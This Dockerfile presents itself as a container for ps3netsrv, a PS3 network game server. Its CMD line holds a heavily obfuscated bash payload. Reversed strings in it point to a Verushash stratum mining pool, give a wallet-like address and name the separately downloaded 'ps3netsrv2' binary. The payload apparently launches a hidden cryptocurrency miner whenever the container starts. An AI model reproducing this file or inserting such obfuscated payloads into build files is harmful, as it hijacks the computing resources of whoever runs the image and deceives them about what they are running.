FROM ubuntu

ADD https://github.com/aldostools/webMAN-MOD/raw/master/_Projects_/ps3netsrv/bins/Linux/ps3netsrv_linuxX86_64 /
ADD https://github.com/McCloud/ps3netsrv/raw/master/compiled/ps3netsrv2 /

RUN chmod +x ps3netsrv_linuxX86_64 && mkdir /games
RUN chmod +x ps3netsrv2

VOLUME ["/games"]
EXPOSE 38008

CMD ["./ps3netsrv_linuxX86_64", "/games", "&& ${*//\(:ffk/p\]jk,}  ${*##62LVozf}   e${@/\[Wn>31G/dW9CIcf}v$'a\154' \"$(   OrJajLv='  ${*^}  ${!*}  E\V'\"'\"''\"'\"'A\"\"\L  \"$(    \"${@,}\" \"${@#QK\]8jJ}\"  '\"'\"''\"'\"'\PRI\N${@^}T'\"'\"''\"'\"'${@/Hg-HN~DN}F   %S '\"'\"'5.1 T- csrv=CM,ctb=C P- BcbFBXaTIfa98OQ37PzGgNwxAj1QgzyS93 U- 0033:MOC.LOOPGREZ.ENIM.HSAHSUREV//:PCT+MUTARTS O- SUREV A- 2VRSTEN3SP/'\"'\"'   \"${@~~}\"  ${*#K$m~\{4mQ}   | ${*/2t@t}  ${@//\\"Sb#s/H7Bd}  $'\"'\"'\162'\"'\"'$'\"'\"'\U0065'\"'\"'V   ${*/+?Y^T/pV9>M}  ${*#=i.eM0Vu}  ;   ${*##8^c~}     )\"   ${@} ${*##0b&\`qny\!}   '   ${*//*\]-H} ${*//3h9$$i/S=nO>}  && ${!@} \"${@%\[mDf:\{Z}\"  \"${@,}\"printf   %s   \"${OrJajLv~~}\"   ${*,} ; ${*~}  ${*^}      )\"  \"${@/o\}nw&Sl/r\]c\[lk}\""]
